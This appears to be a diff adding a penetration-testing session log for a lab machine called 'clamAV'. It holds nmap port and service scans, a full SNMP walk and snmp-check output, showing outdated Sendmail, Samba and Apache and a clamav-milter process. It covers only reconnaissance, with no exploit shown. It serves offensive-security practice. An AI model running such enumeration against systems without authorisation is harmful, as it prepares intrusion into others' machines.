@@ -1,0 +1,675 @@
+=== SESSION START: 2026-08-18 22:58:53 | Box: clamAV | IP: 192.168.128.42 ===
+
+$ nmap -p- --min-rate 10000 -oA nmap/clamAV_allports $BoxIP
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-18 23:08 +0100
+Nmap scan report for 192.168.128.42
+Host is up (0.012s latency).
+Not shown: 65528 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+25/tcp    open  smtp
+80/tcp    open  http
+139/tcp   open  netbios-ssn
+199/tcp   open  smux
+445/tcp   open  microsoft-ds
+60000/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 6.07 seconds
+
+$ nmap -sC -sV -p 22,25,80,139,199,445,60000 -oA nmap/clamAV_services $BoxIP
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-18 23:15 +0100
+Nmap scan report for 192.168.128.42
+Host is up (0.012s latency).
+
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
+|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
+25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
+| smtp-commands: localhost.localdomain Hello [192.168.45.173], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
+|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
+80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
+|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
+|_http-title: Ph33r
+| http-methods: 
+|_  Potentially risky methods: TRACE
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+199/tcp   open  smux        Linux SNMP multiplexer
+445/tcp   open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
+60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
+|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
+Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 5h59m58s, deviation: 2h49m42s, median: 3h59m58s
+|_smb2-time: Protocol negotiation failed (SMB2)
+|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: share (dangerous)
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.14a-Debian)
+|   NetBIOS computer name: 
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2026-08-18T22:15:38-04:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.19 seconds
+scrot: `/home/kali/boxes/clamAV/screenshots/nmap-allports.png` already exists, attempting `/home/kali/boxes/clamAV/screenshots/nmap-allports_000.png` instead
+
+$ nmap -sU --top-ports 100 -oA nmap/clamAV_udp $BoxIP
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-18 23:18 +0100
+Nmap scan report for 192.168.128.42
+Host is up (0.011s latency).
+
+PORT    STATE SERVICE
+161/udp open  snmp
+
+Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
+
+$ snmpwalk -c public -v1 $BoxIP
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686"
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (106542) 0:17:45.42
+iso.3.6.1.2.1.1.4.0 = STRING: "Root <root@localhost> (configure /etc/snmp/snmpd.local.conf)"
+iso.3.6.1.2.1.1.5.0 = STRING: "0xbabe.local"
+iso.3.6.1.2.1.1.6.0 = STRING: "Unknown (configure /etc/snmp/snmpd.local.conf)"
+iso.3.6.1.2.1.1.8.0 = Timeticks: (8) 0:00:00.08
+iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.2.1.31
+iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.1
+iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.2.1.49
+iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.2.1.4
+iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.2.1.50
+iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.6.3.16.2.2.1
+iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.6.3.10.3.1.1
+iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.6.3.11.3.1.1
+iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.15.2.1.1
+iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The MIB module to describe generic objects for network interface sub-layers"
+iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB module for SNMPv2 entities"
+iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The MIB module for managing TCP implementations"
+iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for managing IP and ICMP implementations"
+iso.3.6.1.2.1.1.9.1.3.5 = STRING: "The MIB module for managing UDP implementations"
+iso.3.6.1.2.1.1.9.1.3.6 = STRING: "View-based Access Control Model for SNMP."
+iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The SNMP Management Architecture MIB."
+iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB for Message Processing and Dispatching."
+iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The management information definitions for the SNMP User-based Security Model."
+iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (8) 0:00:00.08
+iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (8) 0:00:00.08
+iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (8) 0:00:00.08
+iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (8) 0:00:00.08
+iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (8) 0:00:00.08
+iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (8) 0:00:00.08
+iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (8) 0:00:00.08
+iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (8) 0:00:00.08
+iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (8) 0:00:00.08
+iso.3.6.1.2.1.2.1.0 = INTEGER: 3
+iso.3.6.1.2.1.2.2.1.1.1 = INTEGER: 1
+iso.3.6.1.2.1.2.2.1.1.2 = INTEGER: 2
+iso.3.6.1.2.1.2.2.1.1.3 = INTEGER: 3
+iso.3.6.1.2.1.2.2.1.2.1 = STRING: "lo"
+iso.3.6.1.2.1.2.2.1.2.2 = STRING: "eth0"
+iso.3.6.1.2.1.2.2.1.2.3 = STRING: "sit0"
+iso.3.6.1.2.1.2.2.1.3.1 = INTEGER: 24
+iso.3.6.1.2.1.2.2.1.3.2 = INTEGER: 6
+iso.3.6.1.2.1.2.2.1.3.3 = INTEGER: 131
+iso.3.6.1.2.1.2.2.1.4.1 = INTEGER: 16436
+iso.3.6.1.2.1.2.2.1.4.2 = INTEGER: 1500
+iso.3.6.1.2.1.2.2.1.4.3 = INTEGER: 1480
+iso.3.6.1.2.1.2.2.1.5.1 = Gauge32: 10000000
+iso.3.6.1.2.1.2.2.1.5.2 = Gauge32: 100000000
+iso.3.6.1.2.1.2.2.1.5.3 = Gauge32: 0
+iso.3.6.1.2.1.2.2.1.6.1 = ""
+iso.3.6.1.2.1.2.2.1.6.2 = Hex-STRING: 00 50 56 9E C9 29 
+iso.3.6.1.2.1.2.2.1.6.3 = Hex-STRING: 00 00 00 00 C9 29 
+iso.3.6.1.2.1.2.2.1.7.1 = INTEGER: 1
+iso.3.6.1.2.1.2.2.1.7.2 = INTEGER: 1
+iso.3.6.1.2.1.2.2.1.7.3 = INTEGER: 2
+iso.3.6.1.2.1.2.2.1.8.1 = INTEGER: 1
+iso.3.6.1.2.1.2.2.1.8.2 = INTEGER: 1
+iso.3.6.1.2.1.2.2.1.8.3 = INTEGER: 2
+iso.3.6.1.2.1.2.2.1.10.1 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.10.2 = Counter32: 4302219
+iso.3.6.1.2.1.2.2.1.10.3 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.11.1 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.11.2 = Counter32: 66767
+iso.3.6.1.2.1.2.2.1.11.3 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.13.1 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.13.2 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.13.3 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.14.1 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.14.2 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.14.3 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.16.1 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.16.2 = Counter32: 4012909
+iso.3.6.1.2.1.2.2.1.16.3 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.17.1 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.17.2 = Counter32: 66198
+iso.3.6.1.2.1.2.2.1.17.3 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.19.1 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.19.2 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.19.3 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.20.1 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.20.2 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.20.3 = Counter32: 0
+iso.3.6.1.2.1.2.2.1.21.1 = Gauge32: 0
+iso.3.6.1.2.1.2.2.1.21.2 = Gauge32: 0
+iso.3.6.1.2.1.2.2.1.21.3 = Gauge32: 0
+iso.3.6.1.2.1.2.2.1.22.1 = OID: ccitt.0
+iso.3.6.1.2.1.2.2.1.22.2 = OID: ccitt.0
+iso.3.6.1.2.1.2.2.1.22.3 = OID: ccitt.0
+iso.3.6.1.2.1.3.1.1.1.2.1.192.168.128.254 = INTEGER: 2
+iso.3.6.1.2.1.3.1.1.2.2.1.192.168.128.254 = Hex-STRING: 00 50 56 9E 59 95 
+iso.3.6.1.2.1.3.1.1.3.2.1.192.168.128.254 = IpAddress: 192.168.128.254
+iso.3.6.1.2.1.4.1.0 = INTEGER: 2
+iso.3.6.1.2.1.4.2.0 = INTEGER: 64
+iso.3.6.1.2.1.4.3.0 = Counter32: 66391
+iso.3.6.1.2.1.4.4.0 = Counter32: 0
+iso.3.6.1.2.1.4.5.0 = Counter32: 0
+iso.3.6.1.2.1.4.6.0 = Counter32: 0
+iso.3.6.1.2.1.4.7.0 = Counter32: 0
+iso.3.6.1.2.1.4.8.0 = Counter32: 0
+iso.3.6.1.2.1.4.9.0 = Counter32: 66340
+iso.3.6.1.2.1.4.10.0 = Counter32: 66193
+iso.3.6.1.2.1.4.11.0 = Counter32: 0
+iso.3.6.1.2.1.4.12.0 = Counter32: 0
+iso.3.6.1.2.1.4.13.0 = INTEGER: 0
+iso.3.6.1.2.1.4.14.0 = Counter32: 0
+iso.3.6.1.2.1.4.15.0 = Counter32: 0
+iso.3.6.1.2.1.4.16.0 = Counter32: 0
+iso.3.6.1.2.1.4.17.0 = Counter32: 0
+iso.3.6.1.2.1.4.18.0 = Counter32: 0
+iso.3.6.1.2.1.4.19.0 = Counter32: 0
+iso.3.6.1.2.1.4.20.1.1.127.0.0.1 = IpAddress: 127.0.0.1
+iso.3.6.1.2.1.4.20.1.1.192.168.128.42 = IpAddress: 192.168.128.42
+iso.3.6.1.2.1.4.20.1.2.127.0.0.1 = INTEGER: 1
+iso.3.6.1.2.1.4.20.1.2.192.168.128.42 = INTEGER: 2
+iso.3.6.1.2.1.4.20.1.3.127.0.0.1 = IpAddress: 255.0.0.0
+iso.3.6.1.2.1.4.20.1.3.192.168.128.42 = IpAddress: 255.255.255.0
+iso.3.6.1.2.1.4.20.1.4.127.0.0.1 = INTEGER: 0
+iso.3.6.1.2.1.4.20.1.4.192.168.128.42 = INTEGER: 1
+iso.3.6.1.2.1.4.21.1.1.0.0.0.0 = IpAddress: 0.0.0.0
+iso.3.6.1.2.1.4.21.1.1.192.168.128.0 = IpAddress: 192.168.128.0
+iso.3.6.1.2.1.4.21.1.2.0.0.0.0 = INTEGER: 2
+iso.3.6.1.2.1.4.21.1.2.192.168.128.0 = INTEGER: 2
+iso.3.6.1.2.1.4.21.1.3.0.0.0.0 = INTEGER: 1
+iso.3.6.1.2.1.4.21.1.3.192.168.128.0 = INTEGER: 0
+iso.3.6.1.2.1.4.21.1.7.0.0.0.0 = IpAddress: 192.168.128.254
+iso.3.6.1.2.1.4.21.1.7.192.168.128.0 = IpAddress: 0.0.0.0
+iso.3.6.1.2.1.4.21.1.8.0.0.0.0 = INTEGER: 4
+iso.3.6.1.2.1.4.21.1.8.192.168.128.0 = INTEGER: 3
+iso.3.6.1.2.1.4.21.1.9.0.0.0.0 = INTEGER: 2
+iso.3.6.1.2.1.4.21.1.9.192.168.128.0 = INTEGER: 2
+iso.3.6.1.2.1.4.21.1.11.0.0.0.0 = IpAddress: 0.0.0.0
+iso.3.6.1.2.1.4.21.1.11.192.168.128.0 = IpAddress: 255.255.255.0
+iso.3.6.1.2.1.4.21.1.13.0.0.0.0 = OID: ccitt.0
+iso.3.6.1.2.1.4.21.1.13.192.168.128.0 = OID: ccitt.0
+iso.3.6.1.2.1.4.22.1.1.2.192.168.128.254 = INTEGER: 2
+iso.3.6.1.2.1.4.22.1.2.2.192.168.128.254 = Hex-STRING: 00 50 56 9E 59 95 
+iso.3.6.1.2.1.4.22.1.3.2.192.168.128.254 = IpAddress: 192.168.128.254
+iso.3.6.1.2.1.4.22.1.4.2.192.168.128.254 = INTEGER: 3
+iso.3.6.1.2.1.4.23.0 = Counter32: 0
+iso.3.6.1.2.1.5.1.0 = Counter32: 8
+iso.3.6.1.2.1.5.2.0 = Counter32: 0
+iso.3.6.1.2.1.5.3.0 = Counter32: 2
+iso.3.6.1.2.1.5.4.0 = Counter32: 0
+iso.3.6.1.2.1.5.5.0 = Counter32: 0
+iso.3.6.1.2.1.5.6.0 = Counter32: 0
+iso.3.6.1.2.1.5.7.0 = Counter32: 0
+iso.3.6.1.2.1.5.8.0 = Counter32: 3
+iso.3.6.1.2.1.5.9.0 = Counter32: 0
+iso.3.6.1.2.1.5.10.0 = Counter32: 3
+iso.3.6.1.2.1.5.11.0 = Counter32: 0
+iso.3.6.1.2.1.5.12.0 = Counter32: 0
+iso.3.6.1.2.1.5.13.0 = Counter32: 0
+iso.3.6.1.2.1.5.14.0 = Counter32: 9
+iso.3.6.1.2.1.5.15.0 = Counter32: 0
+iso.3.6.1.2.1.5.16.0 = Counter32: 3
+iso.3.6.1.2.1.5.17.0 = Counter32: 0
+iso.3.6.1.2.1.5.18.0 = Counter32: 0
+iso.3.6.1.2.1.5.19.0 = Counter32: 0
+iso.3.6.1.2.1.5.20.0 = Counter32: 0
+iso.3.6.1.2.1.5.21.0 = Counter32: 0
+iso.3.6.1.2.1.5.22.0 = Counter32: 3
+iso.3.6.1.2.1.5.23.0 = Counter32: 0
+iso.3.6.1.2.1.5.24.0 = Counter32: 3
+iso.3.6.1.2.1.5.25.0 = Counter32: 0
+iso.3.6.1.2.1.5.26.0 = Counter32: 0
+iso.3.6.1.2.1.6.1.0 = INTEGER: 1
+iso.3.6.1.2.1.6.2.0 = INTEGER: 200
+iso.3.6.1.2.1.6.3.0 = INTEGER: 120000
+iso.3.6.1.2.1.6.4.0 = INTEGER: -1
+iso.3.6.1.2.1.6.5.0 = Counter32: 11
+iso.3.6.1.2.1.6.6.0 = Counter32: 72
+iso.3.6.1.2.1.6.7.0 = Counter32: 0
+iso.3.6.1.2.1.6.8.0 = Counter32: 2
+iso.3.6.1.2.1.6.9.0 = Gauge32: 0
+iso.3.6.1.2.1.6.10.0 = Counter32: 66154
+iso.3.6.1.2.1.6.11.0 = Counter32: 66018
+iso.3.6.1.2.1.6.12.0 = Counter32: 0
+iso.3.6.1.2.1.6.13.1.1.0.0.0.0.25.0.0.0.0.0 = INTEGER: 2
+iso.3.6.1.2.1.6.13.1.1.0.0.0.0.80.0.0.0.0.0 = INTEGER: 2
+iso.3.6.1.2.1.6.13.1.1.0.0.0.0.139.0.0.0.0.0 = INTEGER: 2
+iso.3.6.1.2.1.6.13.1.1.0.0.0.0.199.0.0.0.0.0 = INTEGER: 2
+iso.3.6.1.2.1.6.13.1.1.0.0.0.0.445.0.0.0.0.0 = INTEGER: 2
+iso.3.6.1.2.1.6.13.1.2.0.0.0.0.25.0.0.0.0.0 = IpAddress: 0.0.0.0
+iso.3.6.1.2.1.6.13.1.2.0.0.0.0.80.0.0.0.0.0 = IpAddress: 0.0.0.0
+iso.3.6.1.2.1.6.13.1.2.0.0.0.0.139.0.0.0.0.0 = IpAddress: 0.0.0.0
+iso.3.6.1.2.1.6.13.1.2.0.0.0.0.199.0.0.0.0.0 = IpAddress: 0.0.0.0
+iso.3.6.1.2.1.6.13.1.2.0.0.0.0.445.0.0.0.0.0 = IpAddress: 0.0.0.0
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.25.0.0.0.0.0 = INTEGER: 25
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.80.0.0.0.0.0 = INTEGER: 80
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.139.0.0.0.0.0 = INTEGER: 139
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.199.0.0.0.0.0 = INTEGER: 199
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.445.0.0.0.0.0 = INTEGER: 445
+iso.3.6.1.2.1.6.13.1.4.0.0.0.0.25.0.0.0.0.0 = IpAddress: 0.0.0.0
+iso.3.6.1.2.1.6.13.1.4.0.0.0.0.80.0.0.0.0.0 = IpAddress: 0.0.0.0
+iso.3.6.1.2.1.6.13.1.4.0.0.0.0.139.0.0.0.0.0 = IpAddress: 0.0.0.0
+iso.3.6.1.2.1.6.13.1.4.0.0.0.0.199.0.0.0.0.0 = IpAddress: 0.0.0.0
+iso.3.6.1.2.1.6.13.1.4.0.0.0.0.445.0.0.0.0.0 = IpAddress: 0.0.0.0
+iso.3.6.1.2.1.6.13.1.5.0.0.0.0.25.0.0.0.0.0 = INTEGER: 0
+iso.3.6.1.2.1.6.13.1.5.0.0.0.0.80.0.0.0.0.0 = INTEGER: 0
+iso.3.6.1.2.1.6.13.1.5.0.0.0.0.139.0.0.0.0.0 = INTEGER: 0
+iso.3.6.1.2.1.6.13.1.5.0.0.0.0.199.0.0.0.0.0 = INTEGER: 0
+iso.3.6.1.2.1.6.13.1.5.0.0.0.0.445.0.0.0.0.0 = INTEGER: 0
+iso.3.6.1.2.1.6.14.0 = Counter32: 0
+iso.3.6.1.2.1.6.15.0 = Counter32: 65604
+iso.3.6.1.2.1.7.1.0 = Counter32: 280
+iso.3.6.1.2.1.7.2.0 = Counter32: 3
+iso.3.6.1.2.1.7.3.0 = Counter32: 0
+iso.3.6.1.2.1.7.4.0 = Counter32: 279
+iso.3.6.1.2.1.7.5.1.1.0.0.0.0.137 = IpAddress: 0.0.0.0
+iso.3.6.1.2.1.7.5.1.1.0.0.0.0.138 = IpAddress: 0.0.0.0
+iso.3.6.1.2.1.7.5.1.1.0.0.0.0.161 = IpAddress: 0.0.0.0
+iso.3.6.1.2.1.7.5.1.1.42.128.168.192.137 = IpAddress: 192.168.128.42
+iso.3.6.1.2.1.7.5.1.1.42.128.168.192.138 = IpAddress: 192.168.128.42
+iso.3.6.1.2.1.7.5.1.2.0.0.0.0.137 = INTEGER: 137
+iso.3.6.1.2.1.7.5.1.2.0.0.0.0.138 = INTEGER: 138
+iso.3.6.1.2.1.7.5.1.2.0.0.0.0.161 = INTEGER: 161
+iso.3.6.1.2.1.7.5.1.2.42.128.168.192.137 = INTEGER: 137
+iso.3.6.1.2.1.7.5.1.2.42.128.168.192.138 = INTEGER: 138
+iso.3.6.1.2.1.11.1.0 = Counter32: 222
+iso.3.6.1.2.1.11.2.0 = Counter32: 221
+iso.3.6.1.2.1.11.3.0 = Counter32: 0
+iso.3.6.1.2.1.11.4.0 = Counter32: 0
+iso.3.6.1.2.1.11.5.0 = Counter32: 0
+iso.3.6.1.2.1.11.6.0 = Counter32: 0
+iso.3.6.1.2.1.11.8.0 = Counter32: 0
+iso.3.6.1.2.1.11.9.0 = Counter32: 0
+iso.3.6.1.2.1.11.10.0 = Counter32: 0
+iso.3.6.1.2.1.11.11.0 = Counter32: 0
+iso.3.6.1.2.1.11.12.0 = Counter32: 0
+iso.3.6.1.2.1.11.13.0 = Counter32: 231
+iso.3.6.1.2.1.11.14.0 = Counter32: 0
+iso.3.6.1.2.1.11.15.0 = Counter32: 1
+iso.3.6.1.2.1.11.16.0 = Counter32: 234
+iso.3.6.1.2.1.11.17.0 = Counter32: 0
+iso.3.6.1.2.1.11.18.0 = Counter32: 0
+iso.3.6.1.2.1.11.19.0 = Counter32: 0
+iso.3.6.1.2.1.11.20.0 = Counter32: 0
+iso.3.6.1.2.1.11.21.0 = Counter32: 0
+iso.3.6.1.2.1.11.22.0 = Counter32: 0
+iso.3.6.1.2.1.11.24.0 = Counter32: 0
+iso.3.6.1.2.1.11.25.0 = Counter32: 0
+iso.3.6.1.2.1.11.26.0 = Counter32: 0
+iso.3.6.1.2.1.11.27.0 = Counter32: 0
+iso.3.6.1.2.1.11.28.0 = Counter32: 245
+iso.3.6.1.2.1.11.29.0 = Counter32: 0
+iso.3.6.1.2.1.11.30.0 = INTEGER: 2
+iso.3.6.1.2.1.11.31.0 = Counter32: 0
+iso.3.6.1.2.1.11.32.0 = Counter32: 0
+iso.3.6.1.2.1.25.1.1.0 = Timeticks: (110432) 0:18:24.32
+iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 EA 08 12 16 14 0D 00 2D 04 00 
+iso.3.6.1.2.1.25.1.3.0 = INTEGER: 1536
+iso.3.6.1.2.1.25.1.4.0 = STRING: "root=/dev/sda1 ro 
+"
+iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
+iso.3.6.1.2.1.25.1.6.0 = Gauge32: 44
+iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
+iso.3.6.1.2.1.25.2.2.0 = INTEGER: 256840
+iso.3.6.1.2.1.25.2.3.1.1.2 = INTEGER: 2
+iso.3.6.1.2.1.25.2.3.1.1.3 = INTEGER: 3
+iso.3.6.1.2.1.25.2.3.1.1.4 = INTEGER: 4
+iso.3.6.1.2.1.25.2.3.1.1.5 = INTEGER: 5
+iso.3.6.1.2.1.25.2.3.1.2.2 = OID: iso.3.6.1.2.1.25.2.1.2
+iso.3.6.1.2.1.25.2.3.1.2.3 = OID: iso.3.6.1.2.1.25.2.1.3
+iso.3.6.1.2.1.25.2.3.1.2.4 = OID: isoTimeout: No Response from 192.168.128.42
+.3.6.1.2.1.25.2.1.4
+iso.3.6.1.2.1.25.2.3.1.2.5 = OID: iso.3.6.1.2.1.25.2.1.4
+iso.3.6.1.2.1.25.2.3.1.3.2 = STRING: "Real Memory"
+iso.3.6.1.2.1.25.2.3.1.3.3 = STRING: "Swap Space"
+iso.3.6.1.2.1.25.2.3.1.3.4 = STRING: "/"
+iso.3.6.1.2.1.25.2.3.1.3.5 = STRING: "/sys"
+iso.3.6.1.2.1.25.2.3.1.4.2 = INTEGER: 1024
+iso.3.6.1.2.1.25.2.3.1.4.3 = INTEGER: 1024
+iso.3.6.1.2.1.25.2.3.1.4.4 = INTEGER: 4096
+iso.3.6.1.2.1.25.2.3.1.4.5 = INTEGER: 4096
+iso.3.6.1.2.1.25.2.3.1.5.2 = INTEGER: 256840
+iso.3.6.1.2.1.25.2.3.1.5.3 = INTEGER: 208804
+iso.3.6.1.2.1.25.2.3.1.5.4 = INTEGER: 980382
+iso.3.6.1.2.1.25.2.3.1.5.5 = INTEGER: 0
+iso.3.6.1.2.1.25.2.3.1.6.2 = INTEGER: 118324
+iso.3.6.1.2.1.25.2.3.1.6.3 = INTEGER: 0
+iso.3.6.1.2.1.25.2.3.1.6.4 = INTEGER: 196008
+iso.3.6.1.2.1.25.2.3.1.6.5 = INTEGER: 0
+iso.3.6.1.2.1.25.3.2.1.1.768 = INTEGER: 768
+iso.3.6.1.2.1.25.3.2.1.1.1025 = INTEGER: 1025
+iso.3.6.1.2.1.25.3.2.1.1.1026 = INTEGER: 1026
+iso.3.6.1.2.1.25.3.2.1.1.1027 = INTEGER: 1027
+iso.3.6.1.2.1.25.3.2.1.1.1536 = INTEGER: 1536
+iso.3.6.1.2.1.25.3.2.1.1.1552 = INTEGER: 1552
+
+$ snmp-check $BoxIP
+snmp-check v1.9 - SNMP enumerator
+Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
+
+[+] Try to connect to 192.168.128.42:161 using SNMPv1 and community 'public'
+
+[*] System information:
+
+  Host IP address               : 192.168.128.42
+  Hostname                      : 0xbabe.local
+  Description                   : Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
+  Contact                       : Root <root@localhost> (configure /etc/snmp/snmpd.local.conf)
+  Location                      : Unknown (configure /etc/snmp/snmpd.local.conf)
+  Uptime snmp                   : 00:18:55.41
+  Uptime system                 : 00:18:18.94
+  System date                   : 2026-8-18 22:20:44.0
+
+[*] Network information:
+
+  IP forwarding enabled         : no
+  Default TTL                   : 64
+  TCP segments received         : 66154
+  TCP segments sent             : 66018
+  TCP segments retrans          : 0
+  Input datagrams               : 66606
+  Delivered datagrams           : 66555
+  Output datagrams              : 66401
+
+[*] Network interfaces:
+
+  Interface                     : [ up ] lo
+  Id                            : 1
+  Mac Address                   : :::::
+  Type                          : softwareLoopback
+  Speed                         : 10 Mbps
+  MTU                           : 16436
+  In octets                     : 0
+  Out octets                    : 0
+
+  Interface                     : [ up ] eth0
+  Id                            : 2
+  Mac Address                   : 00:50:56:9e:c9:29
+  Type                          : ethernet-csmacd
+  Speed                         : 100 Mbps
+  MTU                           : 1500
+  In octets                     : 4327534
+  Out octets                    : 4034794
+
+  Interface                     : [ down ] sit0
+  Id                            : 3
+  Mac Address                   : 00:00:00:00:c9:29
+  Type                          : unknown
+  Speed                         : 0 Mbps
+  MTU                           : 1480
+  In octets                     : 0
+  Out octets                    : 0
+
+[*] Network IP:
+
+  Id                    IP Address            Netmask               Broadcast           
+  1                     127.0.0.1             255.0.0.0             0                   
+  2                     192.168.128.42        255.255.255.0         1                   
+
+[*] Routing information:
+
+  Destination           Next hop              Mask                  Metric              
+  0.0.0.0               192.168.128.254       0.0.0.0               1                   
+  192.168.128.0         0.0.0.0               255.255.255.0         0                   
+
+[*] TCP connections and listening ports:
+
+  Local address         Local port            Remote address        Remote port           State               
+  0.0.0.0               25                    0.0.0.0               0                     listen              
+  0.0.0.0               80                    0.0.0.0               0                     listen              
+  0.0.0.0               139                   0.0.0.0               0                     listen              
+  0.0.0.0               199                   0.0.0.0               0                     listen              
+  0.0.0.0               445                   0.0.0.0               0                     listen              
+
+[*] Listening UDP ports:
+
+  Local address         Local port          
+  0.0.0.0               137                 
+  0.0.0.0               138                 
+  0.0.0.0               161                 
+  192.168.128.42        137                 
+  192.168.128.42        138                 
+
+[*] Processes:
+
+  Id                    Status                Name                  Path                  Parameters          
+  1                     runnable              init                  init [2]                                  
+  2                     runnable              ksoftirqd/0           ksoftirqd/0                               
+  3                     runnable              events/0              events/0                                  
+  4                     runnable              khelper               khelper                                   
+  5                     runnable              kacpid                kacpid                                    
+  99                    runnable              kblockd/0             kblockd/0                                 
+  109                   runnable              pdflush               pdflush                                   
+  110                   runnable              pdflush               pdflush                                   
+  111                   runnable              kswapd0               kswapd0                                   
+  112                   runnable              aio/0                 aio/0                                     
+  255                   runnable              kseriod               kseriod                                   
+  276                   runnable              scsi_eh_0             scsi_eh_0                                 
+  284                   runnable              khubd                 khubd                                     
+  348                   runnable              shpchpd_event         shpchpd_event                             
+  380                   runnable              kjournald             kjournald                                 
+  935                   runnable              vmmemctl              vmmemctl                                  
+  1177                  runnable              vmtoolsd              /usr/sbin/vmtoolsd                        
+  3768                  running               syslogd               /sbin/syslogd                             
+  3771                  runnable              klogd                 /sbin/klogd                               
+  3775                  runnable              clamd                 /usr/local/sbin/clamd                      
+  3778                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
+  3787                  runnable              inetd                 /usr/sbin/inetd                           
+  3791                  runnable              nmbd                  /usr/sbin/nmbd        -D                  
+  3793                  runnable              smbd                  /usr/sbin/smbd        -D                  
